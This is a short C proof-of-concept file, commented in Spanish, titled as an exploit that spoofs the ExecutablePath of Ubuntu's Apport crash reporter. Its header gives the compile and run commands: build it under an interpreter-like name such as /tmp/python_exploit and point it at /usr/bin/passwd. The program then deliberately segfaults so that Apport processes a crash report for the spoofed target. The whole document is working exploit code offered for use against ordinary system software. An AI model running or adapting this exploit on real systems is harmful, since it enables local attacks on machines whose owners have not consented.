/*
 * Apport ExecutablePath Spoofing PoC
 *
 * IMPORTANTE: _check_interpreted() solo se activa si el nombre base
 * del binario coincide con patrones de interprete (sh, bash, python*,
 * ruby*, php, perl*, etc.). Compilar con nombre que coincida:
 *   gcc -o /tmp/python_exploit pwn_apport.c
 *   /tmp/python_exploit /usr/bin/passwd
 *
 * Requisitos: apport.service activo, ulimit -c unlimited.
 */

#define _GNU_SOURCE
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <spoofed_target_path>\n", argv[0]);
        return 1;
    }
    raise(SIGSEGV);
    return 0;
}
